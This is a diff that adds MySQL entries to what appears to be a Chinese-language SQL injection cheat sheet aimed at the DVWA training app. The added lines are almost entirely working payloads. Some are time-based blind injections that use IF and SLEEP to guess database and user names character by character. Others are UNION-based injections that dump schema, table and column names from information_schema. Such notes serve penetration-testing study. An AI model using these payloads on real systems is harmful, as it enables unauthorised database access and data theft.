@@ -1218,8 +1218,23 @@ HSQLLDB=========================================================================
 比如直接把某个参数的值删除，改为if((ascii(mid(user(),1,1))=103 and sleep(3))如果ascii(mid(user(),1,1))=103条件为真，则会等待3秒才返回结果，如果ascii(mid(user(),1,1))=103为假，则直接返回页面，这样不断猜测user()的第1,2,3个字符。
 ===================================================================================
 MySQL===================================================================================
+select first_name,last_name from users where user_id=' 1' AND 4463=IF((8703>8706),SLEEP(5),4463)-- cMCw
 
+select first_name,last_name from users where user_id='1' and 0=if(ascii(mid(database(),1,1))=103,sleep(3),10)
+select first_name,last_name from users where user_id='1' and 0=if(ascii(mid(database(),1,1))=103,sleep(3),10)
+猜测数据库名
 
+select ascii(mid(database(),2,1))
+select mid(user(),1,100)
+select mid(version(),1,100)
+select mid(@@version,1,100)
+select mid(@@hostname,1,100)
+
+select mid(1<(select count(*) from information_schema.tables),1,100)
+#根据表的个数来进行判断,是否需要进行延迟执行
+select first_name,last_name from users where user_id='1' and 0=(if (ascii(mid(1<(select count(*) from information_schema.tables),1,100))=49,sleep(3),10))
+
+猜测表名
 ===================================================================================
 Oracle===================================================================================
 
@@ -1331,8 +1346,15 @@ HSQLLDB=========================================================================
 这个很好理解，就是在select后union把数据查询出来，比如先在查询条件后输入order by 3,order by 4..到order by 8的时候报错了，说明select了7条记录。然后条件后输入 and 1=2 union select 1,user(),database()...查询7个数据出来，由于第一个select后有了1=2条件不成i，因此只会查询我们写的select语句，这样覆盖之前的查询记录返回出我们需要的数据，这个速度也非常快。
 ===================================================================================
 MySQL===================================================================================
+select first_name,last_name from users where user_id='11' and 1=2 union all select first_name,last_name from users #
+拖数据库名
+select first_name,last_name from dvwa.users where user_id='1' and 1=2 union all select schemA_name,null from information_schema.schemata  #
 
-
+select first_name,last_name from dvwa.users where user_id='1' and 1=2 union all select schemA_name,null from information_schema.schemata where substring(schema_name,1,1)='d'  #
+拖出表名
+select first_name,last_name from dvwa.users where user_id='1' and 1=2 union all select table_name,null from information_schema.tables where table_schema='dvwa'  #
+拖出列名
+select first_name,last_name from dvwa.users where user_id ='1' and 1=2 union all SELECT column_name,null FROM information_schema.columns where table_schema='dvwa' and table_name='users'  #
 ===================================================================================
 Oracle===================================================================================
 
